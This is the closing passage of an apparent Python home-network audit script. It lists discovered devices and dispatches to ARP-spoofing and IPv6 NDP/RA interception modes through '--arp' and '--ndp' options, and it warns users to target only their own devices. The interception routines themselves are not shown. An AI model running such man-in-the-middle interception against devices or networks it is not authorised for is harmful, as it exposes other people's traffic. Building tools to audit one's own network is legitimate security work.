    """Show discovered devices and let the user choose one to intercept."""
    print("\nDiscovering devices to choose a target ...")
    rows = discover_devices(net)
    cands = [(ip, mac, name) for ip, mac, name, priv, note in rows
             if mac != "(this pc)" and ip != net["gateway"]]
    if not cands:
        print("  No candidate devices found."); return None
    print("\nSelect a device to intercept (YOUR OWN devices only):")
    for idx, (ip, mac, name) in enumerate(cands, 1):
        print(f"  {idx}) {ip:<15} {mac:<18} {name}")
    choice = input("Number (blank to cancel): ").strip()
    if not choice.isdigit() or not (1 <= int(choice) <= len(cands)):
        print("  Cancelled."); return None
    return cands[int(choice) - 1][0]


def main():
    net = get_net()
    args = [a.lower() for a in sys.argv[1:]]

    # --arp [ip] : run the ARP intercept. With an IP it runs non-interactively;
    # without one, it lists devices and lets you pick. (Needs an admin shell.)
    if "--arp" in args:
        i = args.index("--arp")
        nxt = args[i + 1] if i + 1 < len(args) else None
        target = nxt if (nxt and re.match(r"^\d{1,3}(\.\d{1,3}){3}$", nxt)) else None
        if target is None:
            target = _pick_target(net)
        if target:
            step_arp(net, target)
        return

    # --ndp [ipv6] : IPv6 NDP/RA intercept. With an address it runs directly;
    # without one, it lists IPv6 neighbors to pick. (Needs an admin shell.)
    if "--ndp" in args:
        i = args.index("--ndp")
        nxt = args[i + 1] if i + 1 < len(args) else None
        target = nxt if (nxt and ":" in nxt) else None
        step_ndp(net, target)
        return

    # Default = automatic full report. Use --menu / -m for the interactive menu.
    if "--menu" in args or "-m" in args:
        run_menu(net)
    else:
        auto_report(net)


if __name__ == "__main__":
    main()
